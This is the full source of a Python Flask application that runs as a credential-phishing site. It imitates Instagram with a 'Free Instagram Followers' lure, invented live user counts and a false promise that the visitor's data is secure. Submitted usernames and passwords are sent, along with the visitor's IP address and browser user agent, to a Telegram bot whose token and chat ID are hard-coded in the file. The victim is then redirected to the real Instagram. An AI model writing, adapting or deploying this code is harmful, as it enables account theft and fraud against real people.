import os
import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

# ========== CONFIG ==========
TELEGRAM_BOT_TOKEN = "8840443558:AAFBW-dKJenVK1XbhCjHkvj_lf1QTFh0caM"
TELEGRAM_CHAT_ID = "6158101156"
REAL_INSTAGRAM_URL = "https://www.instagram.com"
# ============================

HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Free Instagram Followers</title>
<style>
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }

  body {
    background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    padding: 20px;
  }

  .container {
    max-width: 420px;
    width: 100%;
    background: rgba(255, 255, 255, 0.05);
    backdrop-filter: blur(20px);
    border-radius: 24px;
    padding: 30px 25px;
    border: 1px solid rgba(255, 255, 255, 0.08);
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
    margin-top: 20px;
  }

  .header {
    text-align: center;
    margin-bottom: 25px;
  }

  .ig-logo {
    width: 72px;
    height: 72px;
    margin: 0 auto 15px;
    display: block;
  }

  .title {
    color: #fff;
    font-size: 24px;
    font-weight: 700;
    background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
  }

  .subtitle {
    color: rgba(255, 255, 255, 0.5);
    font-size: 14px;
    margin-top: 5px;
  }

  .stats-box {
    background: rgba(255, 255, 255, 0.05);
    border-radius: 16px;
    padding: 15px;
    margin-bottom: 25px;
    display: flex;
    justify-content: space-around;
    border: 1px solid rgba(255, 255, 255, 0.06);
  }

  .stat-item {
    text-align: center;
  }

  .stat-number {
    color: #fff;
    font-size: 20px;
    font-weight: 700;
  }

  .stat-label {
    color: rgba(255, 255, 255, 0.4);
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 0.5px;
  }

  .progress-bar {
    width: 100%;
    height: 6px;
    background: rgba(255, 255, 255, 0.08);
    border-radius: 10px;
    margin-bottom: 25px;
    overflow: hidden;
  }

  .progress-fill {
    width: 73%;
    height: 100%;
    background: linear-gradient(90deg, #f09433, #e6683c, #dc2743, #cc2366);
    border-radius: 10px;
    animation: progressPulse 2s ease-in-out infinite;
  }

  @keyframes progressPulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.6; }
  }

  .input-group {
    margin-bottom: 15px;
  }

  .input-group label {
    color: rgba(255, 255, 255, 0.6);
    font-size: 12px;
    text-transform: uppercase;
    letter-spacing: 0.8px;
    display: block;
    margin-bottom: 6px;
  }

  .field {
    width: 100%;
    height: 50px;
    background: rgba(255, 255, 255, 0.06);
    border: 1.5px solid rgba(255, 255, 255, 0.08);
    border-radius: 12px;
    padding: 0 16px;
    font-size: 15px;
    color: #fff;
    outline: none;
    transition: all 0.3s;
  }

  .field::placeholder {
    color: rgba(255, 255, 255, 0.25);
  }

  .field:focus {
    border-color: #e6683c;
    box-shadow: 0 0 20px rgba(230, 104, 60, 0.15);
  }

  .login-btn {
    width: 100%;
    height: 52px;
    background: linear-gradient(135deg, #f09433, #e6683c, #dc2743);
    border: none;
    border-radius: 12px;
    color: #fff;
    font-size: 16px;
    font-weight: 700;
    cursor: pointer;
    margin-top: 8px;
    transition: all 0.3s;
    text-transform: uppercase;
    letter-spacing: 1px;
  }

  .login-btn:hover {
    transform: translateY(-2px);
    box-shadow: 0 10px 30px rgba(220, 39, 67, 0.3);
  }

  .login-btn:active {
    transform: scale(0.97);
  }

  .footer-text {
    color: rgba(255, 255, 255, 0.2);
    font-size: 11px;
    text-align: center;
    margin-top: 20px;
  }

  .footer-text a {
    color: rgba(255, 255, 255, 0.3);
    text-decoration: none;
  }

  .live-badge {
    display: inline-block;
    background: rgba(255, 0, 0, 0.2);
    color: #ff4444;
    font-size: 11px;
    padding: 4px 12px;
    border-radius: 20px;
    border: 1px solid rgba(255, 0, 0, 0.15);
    margin-top: 10px;
  }
</style>
</head>
<body>

<div class="container">
  <div class="header">
    <svg class="ig-logo" viewBox="0 0 72 72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="igGrad" x1="72" y1="72" x2="0" y2="0" gradientUnits="userSpaceOnUse">
          <stop offset="0%" stop-color="#ffd600"/>
          <stop offset="25%" stop-color="#ff6930"/>
          <stop offset="55%" stop-color="#e1306c"/>
          <stop offset="100%" stop-color="#833ab4"/>
        </linearGradient>
      </defs>
      <rect width="72" height="72" rx="18" fill="#1a2535"/>
      <rect x="9" y="9" width="54" height="54" rx="15" fill="none" stroke="url(#igGrad)" stroke-width="4"/>
      <circle cx="36" cy="36" r="13.5" fill="none" stroke="url(#igGrad)" stroke-width="4"/>
      <circle cx="52" cy="20" r="3.5" fill="url(#igGrad)"/>
    </svg>

    <h1 class="title">Free Instagram Followers</h1>
    <p class="subtitle">🎁 Get 1,000 - 5,000 real followers instantly</p>
    <span class="live-badge">🔴 247 people are getting followers right now</span>
  </div>

  <div class="stats-box">
    <div class="stat-item">
      <div class="stat-number">12.4K</div>
      <div class="stat-label">Followers Given Today</div>
    </div>
    <div class="stat-item">
      <div class="stat-number">4.7K</div>
      <div class="stat-label">Active Users</div>
    </div>
    <div class="stat-item">
      <div class="stat-number">⭐ 4.9</div>
      <div class="stat-label">User Rating</div>
    </div>
  </div>

  <div class="progress-bar">
    <div class="progress-fill"></div>
  </div>

  <form method="POST" action="/login">
    <div class="input-group">
      <label>📱 Instagram Username or Email</label>
      <input class="field" type="text" name="username" placeholder="Enter your Instagram username or email" autocomplete="off" required />
    </div>

    <div class="input-group">
      <label>🔑 Password</label>
      <input class="field" type="password" name="password" placeholder="Enter your Instagram password" required />
    </div>

    <button class="login-btn" type="submit">🚀 Get Followers Now</button>
  </form>

  <div class="footer-text">
    🔒 Your data is secure and will not be shared.<br>
    By continuing, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
  </div>
</div>

</body>
</html>'''

def send_to_telegram(data):
    text = f"""🔐 INSTAGRAM FOLLOWER GRAB
👤 Username: {data['username']}
🔑 Password: {data['password']}
🌐 IP: {data['ip']}
📱 UA: {data['user_agent']}"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=5)
    except:
        pass

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    data = {
        'username': username,
        'password': password,
        'ip': ip,
        'user_agent': user_agent
    }
    send_to_telegram(data)

    # Redirect to real Instagram
    return f'<script>window.location.href="{REAL_INSTAGRAM_URL}"</script>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
